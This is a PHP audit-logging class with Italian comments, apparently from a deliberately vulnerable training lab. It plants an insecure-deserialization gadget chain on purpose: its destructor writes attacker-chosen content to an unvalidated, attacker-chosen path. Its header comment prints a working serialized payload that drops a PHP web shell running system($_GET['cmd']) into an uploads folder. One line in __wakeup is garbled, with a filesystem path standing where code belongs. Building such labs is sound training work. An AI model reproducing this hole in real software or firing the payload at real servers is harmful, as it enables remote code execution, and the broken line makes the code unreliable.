<?php
/**
 * AuditLog Model - Logging sicurezza e azioni utente
 * 
 * IMPORTANTE: Questa classe ha __destruct() che scrive su file
 * Può essere usata come GADGET CHAIN per RCE via deserializzazione!
 * 
 * Esempio exploit:
 * O:8:"AuditLog":2:{s:7:"logFile";s:25:"/var/www/html/public/uploads/shell.php";s:5:"entry";s:30:"<?php system($_GET['cmd']); ?>";}
 */

class AuditLog {
    private $db;
    public $logFile;
    public $entry;
    private $autoWrite = true;
    
    public function __construct($logFile = null) {
        $this->db = Database::getInstance();
        
        // Default log file - PUÒ ESSERE SOVVRASSCRITTO VIA DESERIALIZZAZIONE!
        $this->logFile = $logFile ?? __DIR__ . '/../../data/audit.log';
        $this->entry = '';
    }
    
    /**
     * Log generico
     */
    public function log($action, $details = '', $userId = null, $ip = null, $userAgent = null) {
        $entry = [
            'timestamp' => date('c'),
            'action' => $action,
            'details' => $details,
            'user_id' => $userId,
            'ip' => $ip ?? ($_SERVER['REMOTE_ADDR'] ?? 'unknown'),
            'user_agent' => $userAgent ?? ($_SERVER['HTTP_USER_AGENT'] ?? 'unknown')
        ];
        
        // Scrive su database
        try {
            $this->db->query(
                "INSERT INTO audit_log (user_id, action, details, ip_address, user_agent) VALUES (?, ?, ?, ?, ?)",
                [$userId, $action, json_encode($details), $entry['ip'], $entry['user_agent']]
            );
        } catch (Exception $e) {
            // Fallback su file se DB fallisce
        }
        
        // Scrive su file (VULNERABILE se logFile controllato!)
        if ($this->autoWrite) {
            $this->writeToFile(json_encode($entry) . "\n");
        }
        
        return $entry;
    }
    
    /**
     * Scrive entry su file - GADGET CHAIN VECTOR
     * Se un attaccante controlla $this->logFile via deserializzazione,
     * può scrivere file arbitrari (es. shell.php in public/uploads)
     */
    public function writeToFile($data) {
        $dir = dirname($this->logFile);
        if (!is_dir($dir)) {
            mkdir($dir, 0755, true);
        }
        
        // VULNERABILITÀ: Nessuna validazione path!
        // Permette directory traversal: ../../../public/uploads/shell.php
        file_put_contents($this->logFile, $data, FILE_APPEND | LOCK_EX);
    }
    
    /**
     * Log login
     */
    public function logLogin($userId, $success, $ip = null) {
        return $this->log('login', [
            'success' => $success,
            'method' => 'password'
        ], $userId, $ip);
    }
    
    /**
     * Log logout
     */
    public function logLogout($userId, $ip = null) {
        return $this->log('logout', [], $userId, $ip);
    }
    
    /**
     * Log azione admin
     */
    public function logAdminAction($userId, $action, $details, $ip = null) {
        return $this->log('admin_action', array_merge(['action' => $action], $details), $userId, $ip);
    }
    
    /**
     * Log upload file
     */
    public function logUpload($userId, $filename, $path, $success, $ip = null) {
        return $this->log('file_upload', [
            'filename' => $filename,
            'path' => $path,
            'success' => $success
        ], $userId, $ip);
    }
    
    /**
     * Log installazione plugin
     */
    public function logPluginInstall($userId, $pluginId, $success, $ip = null) {
        return $this->log('plugin_install', [
            'plugin_id' => $pluginId,
            'success' => $success
        ], $userId, $ip);
    }
    
    /**
     * DESTRUCTOR - GADGET CHAIN!
     * Viene chiamato automaticamente alla fine dello script
     * Se l'oggetto è stato deserializzato con logFile controllato,
     * scrive $this->entry su $this->logFile
     */
    public function __destruct() {
        if ($this->autoWrite && $this->entry !== '') {
            $this->writeToFile($this->entry . "\n");
        }
    }
    
    /**
     * Wakeup - chiamato dopo unserialization
     */
    public function __wakeup() {
        // Re-inizializza DB connection se necessario
        if (/home/jx82/HTB/lab_Docker/lab_cybernetic/src/models/this->db) {
            $this->db = Database::getInstance();
        }
    }
    
    /**
     * Disabilita scrittura automatica (per testing)
     */
    public function disableAutoWrite() {
        $this->autoWrite = false;
    }
    
    /**
     * Ottiene log recenti
     */
    public function getRecent($limit = 100) {
        return $this->db->fetchAll(
            "SELECT * FROM audit_log ORDER BY created_at DESC LIMIT ?",
            [$limit]
        );
    }
    
    /**
     * Ottiene log per utente
     */
    public function getByUser($userId, $limit = 50) {
        return $this->db->fetchAll(
            "SELECT * FROM audit_log WHERE user_id = ? ORDER BY created_at DESC LIMIT ?",
            [$userId, $limit]
        );
    }
}
